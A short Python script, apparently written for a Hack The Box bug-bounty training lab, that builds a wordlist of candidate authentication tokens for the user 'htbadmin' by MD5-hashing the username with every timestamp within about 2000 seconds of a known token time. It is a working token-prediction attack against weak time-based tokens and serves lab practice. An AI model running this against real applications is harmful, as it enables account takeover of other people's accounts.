from hashlib import md5
import pyfiglet

print(pyfiglet.figlet_format("CBBH Tokens"))
time_str = int(input("[+] Enter the time (after you converted using https://www.epochconverter.com/) that htbuser's token is created: "))
start = time_str - 2000
end = time_str + 2000
username = "htbadmin"

with open(f"Tokens.txt","a") as file:
    for x in range(start, end):
        time_str = str(x)
        hashed_token = md5((username+time_str).encode()).hexdigest()
        file.write(f'{hashed_token}\n')

print("\n>>> Tokens.txt is created")